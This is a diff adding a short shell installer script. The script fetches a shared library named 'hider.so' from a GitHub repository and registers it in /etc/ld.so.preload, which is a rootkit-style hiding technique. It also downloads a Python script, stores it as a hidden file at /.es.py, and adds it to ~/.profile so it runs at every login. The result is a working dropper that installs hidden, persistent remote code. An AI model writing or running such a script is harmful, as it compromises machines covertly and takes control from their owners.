@@ -1,0 +1,16 @@
+#!/bin/sh
+
+wget https://raw.github.com/mehdi-desu/projet_impossible/master/modules/hider.so
+mv hider.so /usr/local/lib
+
+echo /usr/local/lib/hider.so >> /etc/ld.so.preload
+
+wget https://raw.github.com/mehdi-desu/projet_impossible/master/es.py
+chmod 755 es.py
+mv es.py /.es.py
+
+sudo apt-get install python-pip
+pip install github3.py
+pip install pygame
+
+echo /.es.py & >> ~/.profile
